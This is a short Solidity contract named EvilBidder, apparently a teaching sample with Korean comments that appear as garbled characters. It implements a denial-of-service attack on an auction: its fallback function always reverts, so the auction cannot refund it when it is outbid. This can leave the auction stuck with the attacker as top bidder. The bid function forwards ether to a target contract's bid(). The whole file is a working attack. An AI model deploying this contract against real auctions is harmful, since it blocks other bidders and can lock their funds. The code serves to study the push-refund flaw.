pragma solidity^0.4.11;
contract EvilBidder{
    //fallback�Լ�
    //Auction ����� �������� ��ȯ�� �� ȣ���
    function() payable {
        revert(); // revert()�Լ��� ȣ��Ǹ� ���ܰ� �߻��Ѵ�
    }
    
    //���� ó�� �Լ� 
    //���ڷ� ���� address�� bid()�Լ��� msg.value�ݾ��� �۱��ϴ� ���·� ȣ����
    function bid(address _to) public payable {
        //���� ó�� 
        if(!_to .call.value(msg.value)(bytes4(sha3("bid()")))){
            throw;
        }
    }
}